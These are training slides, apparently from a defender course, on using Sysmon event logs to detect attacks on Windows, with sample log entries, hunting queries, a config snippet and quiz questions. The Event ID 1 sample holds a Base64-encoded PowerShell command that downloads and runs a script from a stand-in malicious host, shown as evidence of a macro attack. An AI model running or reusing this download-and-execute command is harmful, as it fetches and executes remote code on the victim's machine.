title: Sysmon: The Supercharged Log 🚀
description: Process creation, network connections, and file creation with full command lines.

slides.title: What is Sysmon? ⚡
slides.content:
# The Ultimate Visibility Tool for Windows

**Sysmon** (System Monitor) is a **free** Windows system service and device driver from **Microsoft Sysinternals**.

Once installed, it **dramatically enhances** Windows logging by providing detailed telemetry that standard Event Logs miss.

**What Sysmon Logs (That Windows Doesn't):**
- **Event ID 1: Process Creation** (with full command line and hashes).
- **Event ID 3: Network Connection** (Which process made the connection? To what IP/Port?).
- **Event ID 7: Image Loaded** (What DLL did the process load?).
- **Event ID 8: CreateRemoteThread** (Process injection detection).
- **Event ID 11: FileCreate** (Who created that file in `C:\Windows\Temp`?).
- **Event ID 13: Registry Value Set** (Who modified that Run key?).
- **Event ID 22: DNS Query** (Which process looked up `evil.com`?).

**Log Location:** `Applications and Services Logs/Microsoft/Windows/Sysmon/Operational`

> **If you can only install ONE additional logging tool on Windows, make it Sysmon.**

slides.title: Sysmon Event ID 1: Process Creation 🏭
slides.content:
### The Gold Standard of Execution Evidence

**Standard Windows Event 4688** gives you the executable path.
**Sysmon Event ID 1** gives you:
- **Full Command Line:** *'powershell.exe -enc SQBFAFgA...'*
- **Parent Process:** *'winword.exe'* (Critical for tracking macro exploits).
- **File Hashes:** MD5, SHA256 of the executable.
- **User:** Who ran it.
- **Integrity Level:** High/Medium/Low (Did it run as Admin?).

**Example Log Entry (Event ID 1):**
```text
Process Create:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2026-04-20 09:15:22.123
ProcessGuid: {abc123-...}
ProcessId: 4567
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
CommandLine: "powershell.exe" -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQAXQAuAHAAcwAxACcAKQA=
ParentImage: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
ParentCommandLine: "C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" /n "C:\Users\jsmith\Downloads\Invoice_123.docm"
User: CORP\jsmith
Hashes: SHA256=5B6E6A96B6E6A96B6E6A96B6E6A96B6...
```

**Analysis:** Word document spawned PowerShell with an encoded command. **This is a confirmed macro exploit.**

quizData.question: What critical piece of information does Sysmon Event ID 1 provide that standard Windows Event 4688 often misses?
quizData.explanation: Sysmon records the Parent Process (e.g., `winword.exe` launching `powershell.exe`), which is essential for tracking exploit chains.

slides.title: Sysmon Event ID 3: Network Connection 🌐
slides.content:
### Mapping Process to Traffic

**Standard Firewall Logs** tell you: `192.168.1.100 connected to 185.142.53.179:443`.
**Sysmon Event ID 3** tells you: **`powershell.exe` (PID 4567)** connected to `185.142.53.179:443`.

**This is the missing link.** It connects the **process** to the **network traffic**.

**Key Fields in Event ID 3:**
- **Image:** `powershell.exe`
- **ProcessId:** `4567`
- **SourceIp:** `192.168.1.100`
- **DestinationIp:** `185.142.53.179`
- **DestinationPort:** `443`
- **Protocol:** `TCP`
- **Initiated:** `true` (Was the connection outbound?)

**IR Use Case:** You see an alert for a connection to a known C2 IP. You search Sysmon Event ID 3 for that IP. You find the `ProcessId` and `Image`. You pivot to Sysmon Event ID 1 for that `ProcessId` to see the **full command line** that launched it.

**Query:** *'Show me all outbound connections to port 443 not made by standard browsers.'*

slides.title: Sysmon Event ID 11: FileCreate 📁
slides.content:
### Tracking Malware Drops

**Standard Windows Auditing** can track file creation, but it's noisy and complex to configure.
**Sysmon Event ID 11** provides a clean, targeted log of file creation events.

**Key Fields:**
- **Image:** `chrome.exe` (The process creating the file).
- **TargetFilename:** `C:\Users\jsmith\Downloads\Invoice_123.docm`
- **CreationUtcTime:** Timestamp.

**Why This Matters:**
- **Dropped Malware:** Did `winword.exe` drop `evil.dll` in `C:\Users\Public\Documents`?
- **Ransomware Note:** Did `unknown.exe` create `README_DECRYPT.txt`?
- **Web Downloads:** Track every file downloaded from the browser.

**Hunting Query:** *'Show me all `.exe` or `.dll` files created in `C:\Users\Public` in the last 24 hours.'*

slides.title: Sysmon Event ID 7: Image Loaded (DLLs) 📚
slides.content:
### Detecting DLL Hijacking and Injection

Attackers often load malicious DLLs into legitimate processes to hide their code.

**Event ID 7 logs every DLL loaded by a process.**

**Key Fields:**
- **Image:** `explorer.exe` (The process loading the DLL).
- **ImageLoaded:** `C:\Windows\Temp\evil.dll`
- **Signed:** `false` (Is the DLL digitally signed?).

**Detection Logic:**
- *'Show me any unsigned DLL loaded into `explorer.exe` from a Temp directory.'*
- *'Show me any DLL loaded from `C:\Users\Public`.'*

**This event is **extremely high volume**. You need a **Sysmon Config** to filter out known good DLLs (e.g., `kernel32.dll`) to make it manageable.**

slides.title: Example: Deploying a Sysmon Config 🛠️
slides.content:
Sysmon relies on a **configuration file** (XML) to tell it *what* to log and *what to filter out*.

**Install Sysmon with a Community Config:**
```cmd
Sysmon64.exe -accepteula -i sysmonconfig-export.xml
```

**Recommended Community Configs:**
- **SwiftOnSecurity Sysmon Config:** A popular, well-documented starter config.
- **Olaf Hartong's Sysmon-Modular:** Advanced, ATT&CK-mapped config.

**Simple Config Snippet (Exclude common noise):**
```xml
<Sysmon schemaversion="4.30">
  <EventFiltering>
    <!-- Log ALL process creation -->
    <ProcessCreate onmatch="exclude"/>
    
    <!-- Log network connections, but exclude known good browsers -->
    <NetworkConnect onmatch="exclude">
      <Image condition="end with">chrome.exe</Image>
      <Image condition="end with">firefox.exe</Image>
      <Image condition="end with">msedge.exe</Image>
    </NetworkConnect>
  </EventFiltering>
</Sysmon>
```

**Update Config Remotely:**
```cmd
Sysmon64.exe -c sysmonconfig-export.xml
```

slides.title: Pro Tip: Sysmon + Event ID 22 (DNS) 📡
slides.content:
## The Silent Hunter

**Event ID 22** logs **DNS queries** mapped to the process that made them.

**Why is this a game-changer?**
- **Network Firewalls** only see the **IP address** after DNS resolution.
- **Sysmon sees the domain name `evil-c2.xyz` BEFORE resolution.**
- Even if the attacker uses **DNS over HTTPS (DoH)** in the browser, if the malware uses the standard Windows DNS resolver, Sysmon **still sees it**.

**Hunting for DGA Domains:**
*'Show me processes making DNS queries for domains with high entropy (random-looking strings).'*

**Example:** `pwrshell.exe` queried `a8f3b2c1d4e5.com`. **This is a dead giveaway.**

quizData.question: You need to prove that `powershell.exe` made an outbound connection to a known malicious IP. Which Sysmon Event ID provides this correlation?
quizData.explanation: Event ID 3 logs network connections and includes the Image (process name) and ProcessId.
